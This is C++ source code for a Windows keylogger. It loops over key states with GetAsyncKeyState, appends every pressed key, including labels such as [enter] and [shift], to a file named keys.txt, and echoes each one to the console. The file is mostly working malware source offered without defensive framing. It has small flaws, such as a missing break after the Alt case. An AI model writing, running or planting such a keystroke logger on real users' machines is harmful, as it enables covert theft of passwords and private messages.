#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void startLogging();

int main(){
    // create a file to record the keystrokes being captured
    ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
    startLogging();
    return 0; 
}

void startLogging(){
    // constantly loop through all the characters and check if they are currently being pressed or not
    char c;
    while(true){
        for (c = 0; c < 255; c++){
            bool pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed){
                ofstream keys;
                keys.open("keys.txt", ios::app); // open the log file so that the captured key can be recorded
                const char* key;
                switch (c) {
                    case VK_BACK:
                        key = "[backspace]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                        break;
                    case VK_RETURN:
                        key = "[enter]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                        break;
                    case VK_SHIFT:
                        key = "[shift]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                        break;
                    case VK_CONTROL:
                        key = "[ctrl]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                        break;
                    case VK_CAPITAL:
                        key = "[caps]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                        break;
                    case VK_TAB:
                        key = "[tab]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                        break;
                    case VK_MENU:
                        key = "[alt]";
                        keys << key;
                        std::cout << "Logged: " << key << std::endl;
                    case VK_LBUTTON:
                        break;
                    case VK_RBUTTON:
                        break; 
                    default:
                        keys << c;   
                        std::cout << "Logged: " << c << std::endl;
                }
                
            }
        }
    }
}